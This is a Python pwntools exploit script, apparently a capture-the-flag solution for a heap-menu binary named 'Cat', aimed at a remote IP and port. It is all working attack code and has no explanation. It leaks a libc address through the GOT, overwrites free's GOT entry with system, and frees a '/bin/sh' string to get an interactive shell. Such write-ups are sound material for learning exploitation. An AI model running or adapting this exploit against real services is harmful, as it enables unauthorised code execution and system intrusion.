from pwn import *
context.log_level = 'DEBUG'

e = ELF('./Cat')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p = process('./Cat')
p = remote('178.62.40.102', 6000)

def create(name, kind, age):
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline(name)
    p.recvuntil('> ')
    p.sendline(kind)
    p.recvuntil('> ')
    p.sendline(str(age))

    p.recvuntil('> ')

def edit(i, name, kind, age, save):
    p.sendline('2')
    p.recvuntil('> ')
    p.sendline(str(i))
    p.recvuntil('> ')
    p.sendline(name)
    p.recvuntil('> ')
    p.sendline(kind)
    p.recvuntil('> ')
    p.sendline(str(age))
    p.recvuntil('> ')
    if save:
        p.sendline('y')
    else:
        p.sendline('n')


def print_one(i):
    p.sendline('3')
    p.recvuntil('> ')
    p.sendline(str(i))

    p.recvuntil(': ')
    name = p.recvline()[:-1]
    p.recvuntil(': ')
    t = p.recvline()[:-1]
    p.recvuntil(': ')
    age = p.recvline()[:-1]

    p.recvuntil('> ')

    return (name, t, age)

def print_all():
    p.sendline('4')
    stuff = p.recvuntil('print all:')

    p.recvuntil('> ')

    return stuff

def delete(i):
    p.sendline('5')
    p.recvuntil('> ')
    p.sendline(str(i))

    p.recvuntil('> ')

p.recvuntil('> ')
create("AAAA", "BBBB", 1)
create("AAAA", "BBBB", 2)
edit(1, "a", "b", 2, False)
p.recvuntil('> ')
create("CCCC", p64(e.got['putchar'] + 0x100), 2)
edit(0, "EEEEEEEE", "F"*0x10 + p64(e.got['puts'])[:5], 2, True)
p.recvuntil('> ')

puts_libc, _, _ = print_one(2)
puts_libc = u64(puts_libc.ljust(8, '\x00'))
libc.address = puts_libc - libc.symbols['puts']

print hex(libc.address)

create("/bin/sh", "BBBB", 1)
create("/bin/sh", "BBBB", 2)
edit(4, "a", "b", 2, False)
p.recvuntil('> ')
create("CCCC", p64(e.got['free']), 2)
edit(3, p64(libc.symbols['system']), "FFFF", 2, True)

p.interactive()
